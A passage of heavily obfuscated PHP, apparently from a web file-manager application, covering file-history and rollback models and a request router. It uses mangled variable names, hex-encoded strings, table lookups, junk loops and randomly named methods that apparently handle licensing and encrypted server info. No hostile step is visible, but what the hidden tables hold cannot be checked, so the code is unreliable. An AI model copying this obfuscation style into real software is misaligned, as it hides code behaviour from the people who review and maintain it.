$€ï‰á[$ÑĞ§å¼î[$³ëä™ÆÉ[2241]]]; if ($ÑĞ§å¼î[$³ëä™ÆÉ[33]] == $³ëä™ÆÉ[1975]) { $ÑĞ§å¼î[$³ëä™ÆÉ[2257]] = $ÑĞ§å¼î[$³ëä™ÆÉ[90]]; $ÑĞ§å¼î[$³ëä™ÆÉ[2241]] = $ÑĞ§å¼î[$³ëä™ÆÉ[2257]][$³ëä™ÆÉ[194]]; $ÑĞ§å¼î[$³ëä™ÆÉ[90]] = !1; $ÑĞ§å¼î[$³ëä™ÆÉ[194]] = $³ëä™ÆÉ[12]; } $ÑĞ§å¼î[$³ëä™ÆÉ[2186]] = $‡Ë‹¾ÊÙ[$ÑĞ§å¼î[$³ëä™ÆÉ[1806]]]; } unset($ÑĞ§å¼î); $ÕÎÒ‰§Õ[$³ëä™ÆÉ[448]] = $˜ıÁİ³õ; return $ÕÎÒ‰§Õ; } public function removeBySource($ÓÑÀåì×) { $ı»ıÏ£ç = array($_SERVER[ÓïÕü][494] => $ÓÑÀåì×); $this->where($ı»ıÏ£ç)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\143\x65\137\150\151\163\164\157\x72\x79"; public function historyCount($È°‘ÁÔ) { $“Ç”•£¬ =& $_SERVER[ÓïÕü]; if (!$È°‘ÁÔ) { return array(); } if (is_string($È°‘ÁÔ) || is_int($È°‘ÁÔ)) { $È°‘ÁÔ = array($È°‘ÁÔ); } $”ê§‚ÊÍ = array($“Ç”•£¬[194], $“Ç”•£¬[2258] => $“Ç”•£¬[570]); $ÖíÌû¯£ = array($“Ç”•£¬[194] => array($“Ç”•£¬[7], $È°‘ÁÔ)); $Û£ù¯¥ç = $this->field($”ê§‚ÊÍ)->where($ÖíÌû¯£)->group($“Ç”•£¬[194])->select(); return array_to_keyvalue($Û£ù¯¥ç, $“Ç”•£¬[194], $“Ç”•£¬[570]); } public function addHistory($ê«ìÂ€, $ûÓ…û¶À = '') { $ì¹œò·‹ =& $_SERVER[ÓïÕü]; $ÜÙÎÇ†÷ = array($ì¹œò·‹[494] => $ê«ìÂ€[$ì¹œò·‹[194]], $ì¹œò·‹[1797] => isset($ê«ìÂ€[$ì¹œò·‹[532]]) ? $ê«ìÂ€[$ì¹œò·‹[532]] : $ê«ìÂ€[$ì¹œò·‹[530]], $ì¹œò·‹[547] => $ê«ìÂ€[$ì¹œò·‹[546]], $ì¹œò·‹[625] => $ê«ìÂ€[$ì¹œò·‹[79]], $ì¹œò·‹[2259] => $ûÓ…û¶À); if ($GLOBALS[$ì¹œò·‹[6]][$ì¹œò·‹[92]][$ì¹œò·‹[1330]] >= 1) { $this->historyAutoClear($ÜÙÎÇ†÷[$ì¹œò·‹[194]]); $this->add($ÜÙÎÇ†÷); } Hook::trigger($ì¹œò·‹[2260], $ÜÙÎÇ†÷); Model($ì¹œò·‹[2261])->eventFileEdit($ê«ìÂ€[$ì¹œò·‹[194]]); } private function historyAutoClear($óã‚à™ƒ) { $®Ğ×á˜¯ =& $_SERVER[ÓïÕü]; $Ü±²šş = Model($®Ğ×á˜¯[861])->get($®Ğ×á˜¯[1352]); $µüÄº™® = intval($GLOBALS[$®Ğ×á˜¯[6]][$®Ğ×á˜¯[92]][$®Ğ×á˜¯[1330]]); $ÜŸ´Çê§ = $Ü±²šş == $®Ğ×á˜¯[1353] ? min(5, $µüÄº™®) : $µüÄº™®; $ÜŸ´Çê§ = $ÜŸ´Çê§ <= 0 ? 0 : $ÜŸ´Çê§ - 1; if ($ÜŸ´Çê§ >= 499) { return; } $ÂÎĞ¸š÷ = array($®Ğ×á˜¯[494] => $óã‚à™ƒ); $éËÜÛÁ = $this->field($®Ğ×á˜¯[2262])->where($ÂÎĞ¸š÷)->order($®Ğ×á˜¯[2255])->select(); if (!$éËÜÛÁ || $ÜŸ´Çê§ >= count($éËÜÛÁ)) { return; } $Åü¾£ò¸ = array_to_keyvalue($éËÜÛÁ, $®Ğ×á˜¯[12], $®Ğ×á˜¯[478]); $Åü¾£ò¸ = array_slice($Åü¾£ò¸, $ÜŸ´Çê§); $´Ş§ÛºŞ = array_to_keyvalue($éËÜÛÁ, $®Ğ×á˜¯[12], $®Ğ×á˜¯[546]); $´Ş§ÛºŞ = array_slice($´Ş§ÛºŞ, $ÜŸ´Çê§); if (!$Åü¾£ò¸ || !$´Ş§ÛºŞ) { return; } $ÂÎĞ¸š÷ = array($®Ğ×á˜¯[496] => array($®Ğ×á˜¯[7], $Åü¾£ò¸)); $this->where($ÂÎĞ¸š÷)->delete(); Model($®Ğ×á˜¯[549])->remove($´Ş§ÛºŞ); } public function listData($ÍòÆŸÅˆ) { $‘ºÉÑ¡ =& $_SERVER[ÓïÕü]; $È«ó ˆ§ = array($‘ºÉÑ¡[494] => $ÍòÆŸÅˆ); $¿ÖÄ»Š® = $‘ºÉÑ¡[2263]; $ÊÜÇ’²Ğ = $this->field($¿ÖÄ»Š®)->where($È«ó ˆ§)->order($‘ºÉÑ¡[2255])->selectPage(); $this->_listAppendUser($ÊÜÇ’²Ğ[$‘ºÉÑ¡[448]]); $ªõûèùá = Model($‘ºÉÑ¡[861])->get($‘ºÉÑ¡[1352]); $Ö¹Äù›‚ = 5; if ($ªõûèùá == $‘ºÉÑ¡[1353]) { $ÊÜÇ’²Ğ[$‘ºÉÑ¡[448]] = array_slice($ÊÜÇ’²Ğ[$‘ºÉÑ¡[448]], 0, $Ö¹Äù›‚); $ÊÜÇ’²Ğ[$‘ºÉÑ¡[445]] = array($‘ºÉÑ¡[2264] => 1, $‘ºÉÑ¡[2265] => 20, $‘ºÉÑ¡[2266] => 1, $‘ºÉÑ¡[2267] => count($ÊÜÇ’²Ğ[$‘ºÉÑ¡[448]])); } return $ÊÜÇ’²Ğ; } protected function _listAppendUser(&$’Šğ ›) { $”†¬¢Ö½ =& $_SERVER[ÓïÕü]; $âÚŸÏÕ¥ = array_to_keyvalue($’Šğ ›, $”†¬¢Ö½[12], $”†¬¢Ö½[1806]); $¨ÒüÀ– = Model($”†¬¢Ö½[602])->userListInfo($âÚŸÏÕ¥); foreach ($’Šğ › as &$ó´“†±³) { $“Ì¢ı–’ = $ó´“†±³[$”†¬¢Ö½[1806]]; $ó´“†±³[$”†¬¢Ö½[530]] = $¨ÒüÀ–[$“Ì¢ı–’] ? $¨ÒüÀ–[$“Ì¢ı–’] : !1; } unset($ó´“†±³); } public function fileInfo($¬âËˆ÷, $Ò ê‰ € = false) { $Â±²¯Ñˆ =& $_SERVER[ÓïÕü]; $ıÙºÑ…– = $this->tablePrefix; $ˆ‰ğ”¿Ï = "{$ıÙºÑ…–}\x69\157\x5f\x66\151\x6c\x65\x20\146\151\154\x65\163\40\157\156\x20\x66\x69\x6c\145\x73\56\x66\x69\x6c\x65\x49\104\x20\x3d\40\x68\151\x73\x74\x6f\x72\x79\x2e\x66\151\x6c\x65\111\x44"; $–Œ»çÏú = $this->alias($Â±²¯Ñˆ[2268])->where(array($Â±²¯Ñˆ[496] => $¬âËˆ÷))->join($ˆ‰ğ”¿Ï, $Â±²¯Ñˆ[2269])->find(); if ($–Œ»çÏú && $Ò ê‰ €) { $„©¿Æºº = array($Â±²¯Ñˆ[194] => $–Œ»çÏú[$Â±²¯Ñˆ[194]], $Â±²¯Ñˆ[478] => array($Â±²¯Ñˆ[1117], $¬âËˆ÷)); $–Œ»çÏú[$Â±²¯Ñˆ[1693]] = $this->where($„©¿Æºº)->count(); } return $–Œ»çÏú; } public function removeItem($Ãòƒôší) { $÷ÕÔªòù =& $_SERVER[ÓïÕü]; $±¦³É˜¸ = array($÷ÕÔªòù[496] => $Ãòƒôší); $Îê “¸å = $this->where($±¦³É˜¸)->find(); if ($Îê “¸å) { $ê¡‘³ô– = $this->where($±¦³É˜¸)->delete(); Model($÷ÕÔªòù[549])->remove($Îê “¸å[$÷ÕÔªòù[546]]); return $ê¡‘³ô–; } return !1; } public function removeBySource($“¼¶îÊ¼) { $€ˆÀ–öÇ =& $_SERVER[ÓïÕü]; if (!$“¼¶îÊ¼) { return !1; } if (!is_array($“¼¶îÊ¼)) { $“¼¶îÊ¼ = array($“¼¶îÊ¼); } $¼˜ªš“‚ = array($€ˆÀ–öÇ[494] => array($€ˆÀ–öÇ[7], $“¼¶îÊ¼)); $²¨§Â”® = $this->field($€ˆÀ–öÇ[547])->where($¼˜ªš“‚)->select(); if ($²¨§Â”®) { $this->where($¼˜ªš“‚)->delete(); $Üê¤È­ = array_to_keyvalue($²¨§Â”®, $€ˆÀ–öÇ[12], $€ˆÀ–öÇ[546]); Model($€ˆÀ–öÇ[549])->remove($Üê¤È­); } return !0; } public function setDetail($ÄÅÓ¬ŒÌ, $Ÿ—åà±) { $Í›şÈ—· =& $_SERVER[ÓïÕü]; return $this->where(array($Í›şÈ—·[496] => $ÄÅÓ¬ŒÌ))->save(array($Í›şÈ—·[2259] => $Ÿ—åà±)); } public function rollbackToItem($•ĞÒ¹©î, $á©¾»¯¡) { $—ÌÙ±÷Ó =& $_SERVER[ÓïÕü]; $ü×ˆèßº = Model($—ÌÙ±÷Ó[921])->sourceInfo($•ĞÒ¹©î); $this->addHistory($ü×ˆèßº, LNG($—ÌÙ±÷Ó[2270])); $Ş ÷»” = $this->find($á©¾»¯¡); $øİÄ£êÛ = array($—ÌÙ±÷Ó[546] => $Ş ÷»”[$—ÌÙ±÷Ó[546]], $—ÌÙ±÷Ó[79] => $Ş ÷»”[$—ÌÙ±÷Ó[79]], $—ÌÙ±÷Ó[88] => time(), $—ÌÙ±÷Ó[532] => USER_ID); Model($—ÌÙ±÷Ó[921])->where(array($—ÌÙ±÷Ó[194] => $•ĞÒ¹©î))->save($øİÄ£êÛ); return $this->where(array($—ÌÙ±÷Ó[496] => $á©¾»¯¡))->delete(); } public function clearSame($—“Ò¤¼¡) { $êß‰£ô— =& $_SERVER[ÓïÕü]; $ªüõüå— = $this->listData($—“Ò¤¼¡); $°¡Ã«´ = array_to_keyvalue_group($ªüõüå—, $êß‰£ô—[546]); $€ëôÙÕ© = array(); $ôÄ×–ú = array(); foreach ($°¡Ã«´ as $ç«–«Ÿ) { if (!$ç«–«Ÿ || count($ç«–«Ÿ) <= 1) { continue; } foreach ($ç«–«Ÿ as $õĞ÷‘Ú) { $€ëôÙÕ©[] = $õĞ÷‘Ú[$êß‰£ô—[546]]; $ôÄ×–ú[] = $õĞ÷‘Ú[$êß‰£ô—[478]]; } } if (!$ôÄ×–ú) { return; } $this->where(array($êß‰£ô—[478] => array($êß‰£ô—[7], $ôÄ×–ú)))->delete(); Model($êß‰£ô—[549])->remove($€ëôÙÕ©); } public function userSpace() { $İç°Éæ =& $_SERVER[ÓïÕü]; $ÈµºÛ £ = $this->tablePrefix; $Î”ˆ¸¥Ï = array($İç°Éæ[1797] => USER_ID); $¯²¸§¶’ = "{$ÈµºÛ £}\x69\x6f\137\146\x69\x6c\x65\40\146\x69\x6c\x65\x73\x20\157\156\40\x66\151\154\145\x73\x2e\x66\x69\x6c\x65\x49\104\x20\x3d\40\x68\x69\163\x74\157\162\x79\56\146\x69\x6c\145\111\x44"; return $this->alias($İç°Éæ[2268])->where($Î”ˆ¸¥Ï)->join($¯²¸§¶’, $İç°Éæ[2269])->sum($İç°Éæ[79]); } } goto e”ßÌ’ØÎ; E©¤¥ì»È: class Application { private $defaultModule = "\x69\x6e\144\145\170"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\x69\156\144\x65\170"; function __construct() { } public function setDefault($şõ£‡ ‚) { $òú»½ØÂ =& $_SERVER[ÓïÕü]; $ÈÇ÷Æ—– =& $_SERVER[à¼£¥Õé]; $Âå³ ñ = explode($ÈÇ÷Æ—–[0], trim($şõ£‡ ‚, $ÈÇ÷Æ—–[0])); $ôÒ«ùœ¿ = $òú»½ØÂ[692]; $this->defaultModule = $Âå³ ñ[0] ? $Âå³ ñ[0] : $this->defaultModule; $Š›ßî§ = $òú»½ØÂ[693]; if (!$Š›ßî§) { die; } $this->defaultController = $Âå³ ñ[1] ? $Âå³ ñ[1] : $this->defaultController; $¬ àí‡Í = $òú»½ØÂ[694]; if (strlen($¬ àí‡Í) < $òú»½ØÂ[695]) { die; } $this->defaultAction = $Âå³ ñ[2] ? $Âå³ ñ[2] : $this->defaultAction; $¢ÎŸêÕ‚ = $òú»½ØÂ[696]; while (strlen($¢ÎŸêÕ‚) < $òú»½ØÂ[688]) { if (!$¢ÎŸêÕ‚) { break; } $¢ÎŸêÕ‚++; } $this->khgd3a43213e($ÈÇ÷Æ—–[1], array($this, $ÈÇ÷Æ—–[2])); } public function appRun($Ø­­ÀàÈ) { $¤…£é‚Ö =& $_SERVER[ÓïÕü]; $©ÖáôÖ =& $_SERVER[à¼£¥Õé]; $Éßã™èØ = explode($©ÖáôÖ[0], $Ø­­ÀàÈ); $İó³üà’ = strtolower($Éßã™èØ[0]); $ï¥óÅÚ = $©ÖáôÖ[3]; $§º“´—í = $¤…£é‚Ö[697]; if (!$§º“´—í) { return; } if ($İó³üà’ == $©ÖáôÖ[4]) { $ï¥óÅÚ = $©ÖáôÖ[5]; $Éßã™èØ[0] = $©ÖáôÖ[6]; $Éßã™èØ[1] = $Éßã™èØ[1] . $©ÖáôÖ[7]; $Ø­­ÀàÈ = join($©ÖáôÖ[0], $Éßã™èØ); $Ø­­ÀàÈ = trim($Ø­­ÀàÈ, $©ÖáôÖ[0]); } call_user_func(array($©ÖáôÖ[8], $©ÖáôÖ[9]), $ï¥óÅÚ . $©ÖáôÖ[10], $Ø­­ÀàÈ); ActionCall($Ø­­ÀàÈ); $öé¾ÔèÒ = $¤…£é‚Ö[698]; while ($öé¾ÔèÒ < $¤…£é‚Ö[699]) { if ($öé¾ÔèÒ >= 0) { break; } $öé¾ÔèÒ++; } call_user_func(array($©ÖáôÖ[8], $©ÖáôÖ[9]), $ï¥óÅÚ . $©ÖáôÖ[11], $Ø­­ÀàÈ); } private function autorun() { $ü¦²îÊ =& $_SERVER[ÓïÕü]; $ìËÙ„Ì˜ =& $_SERVER[à¼£¥Õé]; global $config; $Ù¸àÃÇ = $ü¦²îÊ[700]; if (count($config[$ìËÙ„Ì˜[12]]) == 0) { return; } foreach ($config[$ìËÙ„Ì˜[12]] as $­ûğ»ºò => $ŒŠ®åÔ) { $this->appRun($ŒŠ®åÔ); $‹€ú‚åÀ = $ü¦²îÊ[701]; if (!$‹€ú‚åÀ) { die; } } } private function ipkv90300688() { $ıÑíû×Ò =& $_SERVER[ÓïÕü]; $Ô¯ü®–à =& $_SERVER[à¼£¥Õé]; $Ö¤åµä· = $Ô¯ü®–à[4]; $ø§®ïŞ… = $ıÑíû×Ò[702]; $¤ã¢¹íô = $GLOBALS[$Ô¯ü®–à[13]][$Ô¯ü®–à[14]][0]; $ìô½´š› = $ıÑíû×Ò[703]; if (strlen($ìô½´š›) < $ıÑíû×Ò[695]) { return; } if (!$¤ã¢¹íô || strlen($¤ã¢¹íô) <= strlen($Ö¤åµä·)) { return; } if (strtolower(substr($¤ã¢¹íô, -strlen($Ö¤åµä·))) != $Ö¤åµä·) { return; } $ÒøüÑ’À = substr($¤ã¢¹íô, 0, -strlen($Ö¤åµä·)); $ï¶çê¿Ñ = array($Ô¯ü®–à[4], $ÒøüÑ’À); $ş¿ïåÂ· = $ıÑíû×Ò[704]; if (!$ş¿ïåÂ·) { return; } $‚³çÂ” = array_slice($GLOBALS[$Ô¯ü®–à[13]][$Ô¯ü®–à[14]], 1); $£†Ó‘«˜ = $ıÑíû×Ò[705]; while ($£†Ó‘«˜ < $ıÑíû×Ò[706]) { if ($£†Ó‘«˜ >= 0) { break; } $£†Ó‘«˜++; } $GLOBALS[$Ô¯ü®–à[13]][$Ô¯ü®–à[14]] = array_merge($ï¶çê¿Ñ, $‚³çÂ”); $†ŞÔÜÛé = $ıÑíû×Ò[707]; if (strlen($†ŞÔÜÛé) < $ıÑíû×Ò[708]) { return; } $GLOBALS[$Ô¯ü®–à[13]][$Ô¯ü®–à[15]] = implode($Ô¯ü®–à[0], $GLOBALS[$Ô¯ü®–à[13]][$Ô¯ü®–à[14]]); } private function lzbtc548c601() { $ØĞı…½° =& $_SERVER[ÓïÕü]; $†®Œ“×ª =& $_SERVER[à¼£¥Õé]; if ($GLOBALS[$†®Œ“×ª[13]][$†®Œ“×ª[15]] != $†®Œ“×ª[6]) { return; } $„ìå§êª = $_SERVER[$†®Œ“×ª[16]]; $ÔÉÀñ‹¿ = $†®Œ“×ª[17]; if (!strstr($„ìå§êª, $ÔÉÀñ‹¿)) { return; } $ÅÊËÉ°Ê = strrpos($„ìå§êª, $ÔÉÀñ‹¿); $ÎÀşäö¡ = $ØĞı…½°[709]; if (strlen($ÎÀşäö¡) < $ØĞı…½°[695]) { die; } $Œ—›–ÜÅ = substr($„ìå§êª, $ÅÊËÉ°Ê + strlen($ÔÉÀñ‹¿)); $ÀşøÔ™ = $ØĞı…½°[710]; while ($ÀşøÔ™ < $ØĞı…½°[706]) { if ($ÀşøÔ™ >= 0) { break; } $ÀşøÔ™++; } preg_match_all($†®Œ“×ª[18], $Œ—›–ÜÅ, $ã©¤ñ£ˆ); $–„¸Í = $ØĞı…½°[711]; if (strlen($–„¸Í) < $ØĞı…½°[695]) { return; } $Œ—›–ÜÅ = trim($ã©¤ñ£ˆ[0][0], $†®Œ“×ª[19]); $áâ‹ƒŠÄ = $ØĞı…½°[712]; $GLOBALS[$†®Œ“×ª[13]][$†®Œ“×ª[14]] = explode($†®Œ“×ª[19], $Œ—›–ÜÅ); $†ŒœÌ¸Ú = $ØĞı…½°[713]; $GLOBALS[$†®Œ“×ª[13]][$†®Œ“×ª[15]] = implode($†®Œ“×ª[0], $GLOBALS[$†®Œ“×ª[13]][$†®Œ“×ª[14]]); $²ŠºŠ» = $ØĞı…½°[714]; while (strlen($²ŠºŠ») < $ØĞı…½°[699]) { if (!$²ŠºŠ») { break; } $²ŠºŠ»++; } } public function run() { $ ½Øº¤Ù =& $_SERVER[ÓïÕü]; $À¸¢ÇÉï =& $_SERVER[à¼£¥Õé]; $this->lzbtc548c601(); $´–ÁÄ­² = $ ½Øº¤Ù[715]; $this->ipkv90300688(); $ôŒİ¬ºÀ = $ ½Øº¤Ù[716]; if (strlen($ôŒİ¬ºÀ) < $ ½Øº¤Ù[708]) { die; } $Àù×ìÄÍ = $GLOBALS[$À¸¢ÇÉï[13]][$À¸¢ÇÉï[14]]; $ûë­‘ = $GLOBALS[$À¸¢ÇÉï[13]][$À¸¢ÇÉï[15]]; define($À¸¢ÇÉï[20], isset($Àù×ìÄÍ[0]) && $Àù×ìÄÍ[0] ? $Àù×ìÄÍ[0] : $this->defaultModule); define($À¸¢ÇÉï[21], isset($Àù×ìÄÍ[1]) && $Àù×ìÄÍ[0] ? $Àù×ìÄÍ[1] : $this->defaultController); $Ñª÷Ÿ™» = $ ½Øº¤Ù[717]; while (strlen($Ñª÷Ÿ™») < $ ½Øº¤Ù[688]) { if (!$Ñª÷Ÿ™») { break; } $Ñª÷Ÿ™»++; } define($À¸¢ÇÉï[22], isset($Àù×ìÄÍ[2]) && $Àù×ìÄÍ[0] ? $Àù×ìÄÍ[2] : $this->defaultAction); define($À¸¢ÇÉï[23], MOD . $À¸¢ÇÉï[0] . ST . $À¸¢ÇÉï[0] . ACT); $ÜÇó†Ê = $ ½Øº¤Ù[718]; if (!$ÜÇó†Ê) { return; } $_SERVER[$À¸¢ÇÉï[24]] = strtolower(ACTION); $¤’êÌŠü = $ ½Øº¤Ù[719]; if (!$¤’êÌŠü) { return; } $this->autorun(); $•‰‘†ú = $ ½Øº¤Ù[720]; while (strlen($•‰‘†ú) < $ ½Øº¤Ù[695]) { if (!$•‰‘†ú) { break; } $•‰‘†ú++; } if (count($Àù×ìÄÍ) >= 3) { $this->appRun($ûë­‘); } else { $this->appRun(ACTION); } } private $fcuyae97c967 = array(); private $nlgx2fa81bb8 = ''; public function ukzc255d61e6() { $ÆÄ‘œ¿° =& $_SERVER[ÓïÕü]; $“æ·Æ ± =& $_SERVER[à¼£¥Õé]; $this->iudg11ef605b(); $ôÈì‹á = $ÆÄ‘œ¿°[721]; if (strlen($ôÈì‹á) < $ÆÄ‘œ¿°[699]) { return; } $this->cikj76933d24(); $¸İ Œô‚ = $ÆÄ‘œ¿°[722]; if (!$¸İ Œô‚) { return; } $this->ysnx09334f32(); $ØŒÂáÎ” = $ÆÄ‘œ¿°[723]; if (strlen($ØŒÂáÎ”) < $ÆÄ‘œ¿°[706]) { return; } $this->rvjqb62e2739(); $á¨¿ØÖğ = $ÆÄ‘œ¿°[724]; if (!$á¨¿ØÖğ) { die; } $this->lrfb73a1e8be(); $šÍ¹¹™â = $ÆÄ‘œ¿°[725]; $this->yjbnbfb4eb4d(); $´İö¤×å = $ÆÄ‘œ¿°[726]; while (strlen($´İö¤×å) < $ÆÄ‘œ¿°[706]) { if (!$´İö¤×å) { break; } $´İö¤×å++; } $this->nhrobfdb9765(); $Éû°ë¹¾ = $ÆÄ‘œ¿°[727]; $this->khgd3a43213e($“æ·Æ ±[25], array($this, $“æ·Æ ±[26])); $Êñ¾ş÷Å = $ÆÄ‘œ¿°[728]; if (!$Êñ¾ş÷Å) { die; } $this->khgd3a43213e($“æ·Æ ±[27], array($this, $“æ·Æ ±[28])); $ö„‹¿¨š = $ÆÄ‘œ¿°[729]; while ($ö„‹¿¨š < $ÆÄ‘œ¿°[688]) { if ($ö„‹¿¨š >= 0) { break; } $ö„‹¿¨š++; } $this->khgd3a43213e($“æ·Æ ±[29], array($this, $“æ·Æ ±[30])); $this->khgd3a43213e($“æ·Æ ±[31], array($this, $“æ·Æ ±[32])); } public function uvzfba843679($·«õÉ¾) { $·®Ò¤‡ =& $_SERVER[ÓïÕü]; $ú©›­Ä =& $_SERVER[à¼£¥Õé]; $–´îöæ… = Model($ú©›­Ä[33])->get(); $¯û…ôû´ = array($ú©›­Ä[34], $ú©›­Ä[35], $ú©›­Ä[36], $ú©›­Ä[37], $ú©›­Ä[38], $ú©›­Ä[39], $ú©›­Ä[40], $ú©›­Ä[41], $ú©›­Ä[42], $ú©›­Ä[43], $ú©›­Ä[44], $ú©›­Ä[45], $ú©›­Ä[46], $ú©›­Ä[47], $ú©›­Ä[48], $ú©›­Ä[49], $ú©›­Ä[50], $ú©›­Ä[51], $ú©›­Ä[52], $ú©›­Ä[53], $ú©›­Ä[54], $ú©›­Ä[55], $ú©›­Ä[56], $ú©›­Ä[57], $ú©›­Ä[58], $ú©›­Ä[59], $ú©›­Ä[60], $ú©›­Ä[61], $ú©›­Ä[62], $ú©›­Ä[63], $ú©›­Ä[64], $ú©›­Ä[65], $ú©›­Ä[66], $ú©›­Ä[67], $ú©›­Ä[68], $ú©›­Ä[69], $ú©›­Ä[70], $ú©›­Ä[71], $ú©›­Ä[72], $ú©›­Ä[73], $ú©›­Ä[74], $ú©›­Ä[75], $ú©›­Ä[76], $ú©›­Ä[77], $ú©›­Ä[78], $ú©›­Ä[79], $ú©›­Ä[80], $ú©›­Ä[81], $ú©›­Ä[82], $ú©›­Ä[83], $ú©›­Ä[84], $ú©›­Ä[85]); foreach ($¯û…ôû´ as $»ØœÑ€) { $Ï—Òª‰Á = $GLOBALS[$ú©›­Ä[86]][$ú©›­Ä[87]][$»ØœÑ€]; if (isset($–´îöæ…[$»ØœÑ€])) { $Ï—Òª‰Á = $–´îöæ…[$»ØœÑ€]; } $·«õÉ¾[$ú©›­Ä[88]][$ú©›­Ä[89]][$»ØœÑ€] = $Ï—Òª‰Á; } $ğ¨âŞĞ = $·«õÉ¾[$ú©›­Ä[88]][$ú©›­Ä[89]][$ú©›­Ä[46]]; $ş¨ª°ëÚ = $·®Ò¤‡[730]; unset($·«õÉ¾[$ú©›­Ä[88]][$ú©›­Ä[90]][$ú©›­Ä[91]]); $Üë›Õ…î = $·®Ò¤‡[731]; if (!$Üë›Õ…î) { return; } unset($·«õÉ¾[$ú©›­Ä[88]][$ú©›­Ä[90]][$ú©›­Ä[92]]); $Á¸„¥Ÿ = $·®Ò¤‡[732]; unset($·«õÉ¾[$ú©›­Ä[88]][$ú©›­Ä[89]][$ú©›­Ä[46]]); $Ì¼å¤ì = $·®Ò¤‡[733]; if (strlen($Ì¼å¤ì) < $·®Ò¤‡[688]) { return; } unset($·«õÉ¾[$ú©›­Ä[88]][$ú©›­Ä[89]][$ú©›­Ä[93]]); $ı’·ûÕú = $·®Ò¤‡[734]; if (!$ı’·ûÕú) { return; } $·«õÉ¾[$ú©›­Ä[88]][$ú©›­Ä[89]][$ú©›­Ä[94]] = array($ú©›­Ä[95] => (int) $ğ¨âŞĞ[$ú©›­Ä[96]], $ú©›­Ä[97] => (int) _get($ğ¨âŞĞ, $ú©›­Ä[98], 0)); $ó¯–ĞıÊ = $·®Ò¤‡[735]; $æ à š‡ = substr(md5($ú©›­Ä[99] . get_client_ip() . $–´îöæ…[$ú©›­Ä[100]]), 0, 15); $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[102]] = Mcrypt::encode(Session::sign(), $æ à š‡, 3600 * 24); $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[103]] = Action($ú©›­Ä[104])->accessToken(); $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[105]] = md5($_SERVER[$ú©›­Ä[106]] . $–´îöæ…[$ú©›­Ä[100]]); $Şí¸£‘ = $·®Ò¤‡[736]; if (strlen($Şí¸£‘) < $·®Ò¤‡[706]) { die; } $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[107]] = base64_encode(serverInfo()); $ë›©ƒ± = $·®Ò¤‡[737]; while (strlen($ë›©ƒ±) < $·®Ò¤‡[695]) { if (!$ë›©ƒ±) { break; } $ë›©ƒ±++; } $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[108]] = $this->nlgx2fa81bb8; if ($–´îöæ…[$ú©›­Ä[108]] != $ú©›­Ä[109]) { $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[110]] = $–´îöæ…[$ú©›­Ä[110]]; $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[111]] = $–´îöæ…[$ú©›­Ä[111]]; $Áè‰¡€ğ = rand_string(10) . $this->nlgx2fa81bb8 . rand_string(5); $·«õÉ¾[$ú©›­Ä[88]][$ú©›­Ä[112]][$ú©›­Ä[113]] = $this->hlxj37619dac($Áè‰¡€ğ, $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[105]]); } if ($this->nlgx2fa81bb8 == $ú©›­Ä[109]) { $·«õÉ¾[$ú©›­Ä[88]][$ú©›­Ä[89]][$ú©›­Ä[94]][$ú©›­Ä[98]] = 0; } $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[114]] = $this->versionPluginFilter(); $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[115]] = _get($this->fcuyae97c967, $ú©›­Ä[116], $ú©›­Ä[6]); if (KodUser::isRoot() && $this->config[$ú©›­Ä[117]]) { $·«õÉ¾[$ú©›­Ä[101]][$ú©›­Ä[118]] = WEB_ROOT; } return $·«õÉ¾; } private function yjbnbfb4eb4d() { $ÁĞœÑÖŸ =& $_SERVER[ÓïÕü]; $û°œşÁ =& $_SERVER[à¼£¥Õé]; $„é ïñÎ = $_SERVER[$û°œşÁ[24]] == $û°œşÁ[119]; $øÓ¢Ì§ = $ÁĞœÑÖŸ[738]; if (!$øÓ¢Ì§) { return; } if ($_SERVER[$û°œşÁ[24]] == $û°œşÁ[120] && $_GET[$û°œşÁ[121]] == $û°œşÁ[122]) { $„é ïñÎ = !0; } if ($„é ïñÎ) { $­«‡ÅÄ¶ = array($û°œşÁ[108] => $this->nlgx2fa81bb8, $û°œşÁ[123] => $this->syahcfa1f56c(), $û°œşÁ[124] => Model($û°œşÁ[125])->count()); if ($this->nlgx2fa81bb8 != $û°œşÁ[109]) { $»ê«ÀÃŞ = _get($this->fcuyae97c967, $û°œşÁ[126]); if ($»ê«ÀÃŞ) { $­«‡ÅÄ¶[$û°œşÁ[127]] = $»ê«ÀÃŞ; $­«‡ÅÄ¶[$û°œşÁ[128]] = strtotime(_get($this->fcuyae97c967, $û°œşÁ[129])); $­«‡ÅÄ¶[$û°œşÁ[130]] = _get($this->fcuyae97c967, $û°œşÁ[116]); } $Ë’—ƒïØ = Model($û°œşÁ[33])->get($û°œşÁ[131], $û°œşÁ[6], !0); if (is_string($Ë’—ƒïØ) && substr($Ë’—ƒïØ, 0, 1) == $û°œşÁ[132]) { $Ë’—ƒïØ = json_decode_force($Ë’—ƒïØ); } if (is_array($Ë’—ƒïØ) && $Ë’—ƒïØ[$û°œşÁ[133]] && strstr($Ë’—ƒïØ[$û°œşÁ[133]], $û°œşÁ[134])) { $Ø÷–‰¾ã = explode($û°œşÁ[134], $Ë’—ƒïØ[$û°œşÁ[133]]); $­«‡ÅÄ¶[$û°œşÁ[135]] = $Ø÷–‰¾ã[0]; } } $­«‡ÅÄ¶ = $this->ygcq5c08912c(json_encode($­«‡ÅÄ¶), md5($û°œşÁ[136])); $‰úûÇ´¬ = array($û°œşÁ[137] => $­«‡ÅÄ¶); $›ù…‘ = $ÁĞœÑÖŸ[739]; while ($›ù…‘ < $ÁĞœÑÖŸ[708]) { if ($›ù…‘ >= 0) { break; } $›ù…‘++; } call_user_func(array($û°œşÁ[138], $û°œşÁ[139]), $‰úûÇ´¬); } if ($this->nlgx2fa81bb8 == $û°œşÁ[109]) { return; } $›×ˆ™æ› = array($û°œşÁ[140], $û°œşÁ[141], $û°œşÁ[142], $û°œşÁ[143], $û°œşÁ[144], $û°œşÁ[145]); $ïèàÉ±ë = $ÁĞœÑÖŸ[740]; $öÎ¶Âã÷ = 